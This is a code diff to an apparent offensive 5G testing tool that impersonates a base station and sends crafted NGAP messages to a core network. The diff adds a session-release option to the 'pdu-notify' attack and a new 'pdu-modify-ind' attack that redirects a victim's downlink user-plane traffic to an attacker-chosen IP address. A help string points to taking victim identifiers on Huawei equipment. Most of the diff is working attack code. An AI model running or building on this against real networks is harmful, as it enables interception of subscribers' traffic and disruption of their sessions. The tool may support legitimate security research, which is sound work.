@@ -367,10 +367,40 @@ def cmd_ho_window_inject(gnb, a):
 
 
 def cmd_pdu_notify(gnb, a):
-    gnb.send(B.pdu_session_resource_notify(a.amf_ue_id, a.ran_ue_id), wait=False)
-    print(f"[pdu-notify] amf={a.amf_ue_id} sent (Class-2)")
-    _save(a.evidence, {"attack": "pdu-notify", "amf_ue_id": a.amf_ue_id})
+    sessions = parse_sessions(a.pdu_sessions)
+    gnb.send(B.pdu_session_resource_notify(
+        a.amf_ue_id, a.ran_ue_id, pdu_sessions=sessions, released=a.release),
+        wait=False)
+    kind = "released-list" if a.release else "notify-list"
+    print(f"[pdu-notify] amf={a.amf_ue_id} ran={a.ran_ue_id} "
+          f"pdu={sessions} {kind} sent proc=30 (Class-2)")
+    if a.release:
+        print("[pdu-notify] a session release shows up as "
+              "PDUSessionResourceReleaseCommand on the legitimate gNB")
+    _save(a.evidence, {"attack": "pdu-notify", "amf_ue_id": a.amf_ue_id,
+                       "ran_ue_id": a.ran_ue_id, "pdu_sessions": sessions,
+                       "released": bool(a.release)})
     _listen_after(gnb, a, "pdu-notify")
+
+
+def cmd_pdu_modify_ind(gnb, a):
+    """Class-1 Modify Indication: advertise a new downlink NG-U endpoint."""
+    from .cases_p05_p09 import pdu_session_resource_modify_indication
+    ip = resolve_attacker_ip(gnb.cfg, a)
+    sessions = parse_sessions(a.pdu_sessions)
+    print(f"[pdu-modify-ind] amf={a.amf_ue_id} ran={a.ran_ue_id} "
+          f"pdu={sessions} dl-tnl={ip} teid={a.teid:#010x}")
+    r = gnb.send(pdu_session_resource_modify_indication(
+        a.amf_ue_id, a.ran_ue_id, gnb.cfg, pdu_sessions=sessions,
+        attacker_ip=ip, teid=a.teid))
+    print(f"[pdu-modify-ind] reply: {ngap.summarize(r) if r else '(no reply)'}")
+    _save(a.evidence, {"attack": "pdu-modify-ind",
+                       "amf_ue_id": a.amf_ue_id,
+                       "ran_ue_id": a.ran_ue_id,
+                       "pdu_sessions": sessions,
+                       "attacker_n3_ip": ip,
+                       "teid": a.teid,
+                       "reply": ngap.message_type(r) if r else None})
 
 
 def cmd_handover_notify(gnb, a):
@@ -977,7 +1007,25 @@ def main():
     s.add_argument("--tmsi", required=True,
                    help="5G-TMSI as 8 hex digits")
 
-    for name in ("pdu-notify", "handover-notify", "ul-nrppa", "ul-ran-status"):
+    s = sub.add_parser("pdu-notify")
+    s.add_argument("--amf-ue-id", type=int, required=True)
+    s.add_argument("--ran-ue-id", type=int, default=99,
+                   help="Huawei: victim RAN-UE-NGAP-ID from extract-ue-ids")
+    s.add_argument("--pdu-sessions", default="1")
+    s.add_argument("--release", action="store_true",
+                   help="send PDUSessionResourceReleasedListNot (session release) "
+                        "instead of the placeholder notify list")
+
+    s = sub.add_parser("pdu-modify-ind")
+    s.add_argument("--amf-ue-id", type=int, required=True)
+    s.add_argument("--ran-ue-id", type=int, default=99,
+                   help="Huawei: victim RAN-UE-NGAP-ID from extract-ue-ids")
+    s.add_argument("--pdu-sessions", default="1")
+    s.add_argument("--attacker-ip", default="auto",
+                   help="downlink NG-U IPv4 to advertise (default: bind_ip)")
+    s.add_argument("--teid", type=lambda x: int(x, 0), default=0x11111111)
+
+    for name in ("handover-notify", "ul-nrppa", "ul-ran-status"):
         s = sub.add_parser(name)
         s.add_argument("--amf-ue-id", type=int, required=True)
         s.add_argument("--ran-ue-id", type=int, default=99,
@@ -1066,6 +1114,7 @@ def main():
      "handover-required": cmd_handover_required,
      "ho-window-inject": cmd_ho_window_inject,
      "pdu-notify": cmd_pdu_notify,
+     "pdu-modify-ind": cmd_pdu_modify_ind,
      "retrieve-ue-info": cmd_retrieve_ue_info,
      "handover-notify": cmd_handover_notify,
      "ul-nrppa": cmd_nrppa,
